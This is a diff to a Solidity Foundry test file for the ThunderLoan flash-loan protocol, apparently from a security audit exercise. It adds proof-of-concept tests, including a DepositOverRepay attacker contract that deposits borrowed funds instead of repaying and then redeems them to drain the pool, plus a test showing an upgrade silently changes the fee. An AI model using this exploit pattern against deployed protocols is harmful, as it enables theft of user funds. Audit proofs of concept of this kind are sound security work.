@@ -5,6 +5,7 @@ import { Test, console, console2 } from "forge-std/Test.sol";
 import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
 import { AssetToken } from "../../src/protocol/AssetToken.sol";
 import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
+import { ThunderLoanUpgraded } from  "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
 
 import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
 import { ERC20Mock } from "../mocks/ERC20Mock.sol"; 
@@ -164,6 +165,34 @@ contract ThunderLoanTest is BaseTest {
 
         assert(attackFee < normalFeeCost); 
     }
+
+    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
+        vm.startPrank(user); 
+        uint256 amountToBorrow = 50e18; 
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan)); 
+        tokenA.mint(address(dor), fee); 
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, ""); 
+        dor.redeemMoney();
+        vm.stopPrank(); 
+        
+        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee); 
+    }
+
+
+    function testUpgradesBreaks() public {
+        uint256 feeBeforeUpgrade = thunderLoan.getFee(); 
+        vm.startPrank(thunderLoan.owner()); 
+        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
+        thunderLoan.upgradeToAndCall(address(upgraded), ""); 
+        uint256 feeAfterUpgrade = thunderLoan.getFee(); 
+        vm.stopPrank(); 
+
+        console2.log("fee before upgrade:", feeBeforeUpgrade);  
+        console2.log("fee after upgrade:", feeAfterUpgrade); 
+
+        assert(feeBeforeUpgrade != feeAfterUpgrade); 
+    }  
 } 
 
 contract MaliciousFlashLoanReceiver is IFlashLoanReceiver { 
@@ -217,5 +246,37 @@ contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
         }
         return true; 
     }
+}
 
+
+contract DepositOverRepay is IFlashLoanReceiver { 
+    ThunderLoan thunderLoan; 
+    AssetToken assetToken; 
+    IERC20 s_token; 
+
+    constructor(address _thunderLoan) {
+        thunderLoan = ThunderLoan(_thunderLoan); 
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address /*initiator*/,
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        s_token = IERC20(token); 
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token)); 
+        IERC20(token).approve(address(thunderLoan), amount + fee); 
+        thunderLoan.deposit(IERC20(token), amount + fee); 
+        return true; 
+    }
+
+    function redeemMoney() public {
+        uint256 amount = assetToken.balanceOf(address(this)); 
+        thunderLoan.redeem(s_token, amount); 
+    }
 }
